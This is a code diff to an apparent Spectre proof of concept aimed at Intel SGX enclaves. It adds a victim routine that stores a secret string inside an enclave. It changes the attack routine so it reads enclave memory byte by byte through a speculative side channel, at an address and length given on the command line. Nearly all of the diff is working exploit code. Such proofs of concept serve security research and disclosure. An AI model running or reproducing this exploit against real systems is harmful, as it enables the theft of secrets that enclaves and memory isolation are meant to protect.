@@ -18,6 +18,7 @@
 #include <assert.h>
 #include <stdlib.h>
 #include <stdint.h>
+#include <unistd.h>
 #ifdef _MSC_VER
 #include <intrin.h> /* for rdtscp and clflush */
 #pragma optimize("gt",on)
@@ -114,10 +115,10 @@ uint8_t array2[256 * 512];
 	score[1] = results[k];
  }
 
-
-int spectre_main(int argc, char **argv) {
-	size_t malicious_x; 
-	sgx_status_t ret  = ecall_get_offset(global_eid, &malicious_x); /* default for malicious_x */
+int victim_main() {
+	sgx_status_t ret = ecall_store_secret(global_eid, "The Magic Words are Squeamish Ossifrage.");
+	size_t malicious_x;
+	ret  = ecall_get_offset(global_eid, &malicious_x); /* default for malicious_x */
 	if (ret != SGX_SUCCESS)
         	abort();
 
@@ -128,9 +129,43 @@ int spectre_main(int argc, char **argv) {
 	for (i = 0; i < sizeof(array2); i++)
 		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
 
+	printf("Try attack by running './sgxspectre %p 40'. Press [RETURN] to continue.\n", (void *)malicious_x);
+	getchar();
+	printf("Reading %d bytes:\n", len);
+
+	while (--len >= 0) {
+		printf("Reading at malicious_x = %p... ", (void*)malicious_x);
+		readMemoryByte(malicious_x++, value, score);
+		printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
+		printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+		if (score[1] > 0)
+			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
+		printf("\n");
+	}
+
+	malicious_x -= 40;
+	printf("Try attack by running './sgxspectre %p 40'\n", (void *)malicious_x);
+	getchar();
+	return (0);
+}
+
+int spectre_main(int argc, char **argv) {
+	// sgx_status_t ret = ecall_store_secret(global_eid, "The Magic Words are Squeamish Ossifrage.");
+	size_t malicious_x;
+	// ret  = ecall_get_offset(global_eid, &malicious_x); /* default for malicious_x */
+	// if (ret != SGX_SUCCESS)
+        	// abort();
+
+	
+	int i, score[2], len=40;
+	uint8_t value[2];
+	
+	for (i = 0; i < sizeof(array2); i++)
+		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
+
 	if (argc == 3) {
 		sscanf(argv[1], "%p", (void**)(&malicious_x));
-		malicious_x -= (size_t)array1dupe; /* Convert input value into a pointer */
+		// malicious_x -= (size_t)array1dupe; /* Convert input value into a pointer */
 		sscanf(argv[2], "%d", &len);
 	}
 	
@@ -147,16 +182,18 @@ int spectre_main(int argc, char **argv) {
 	}
 
 	return (0);
- }
+}
 
 /* Application entry */
-int main(int argc, char *argv[])
-{
+int main(int argc, char *argv[]) {
     /* Initialize the enclave */
     initialize_enclave();
  
+    /* Call the main victim function*/
+	if (argc == 1) victim_main();
+
     /* Call the main attack function*/
-    spectre_main(argc, argv); 
+    else spectre_main(argc, argv); 
 
     /* Destroy the enclave */
 	 destroy_enclave();
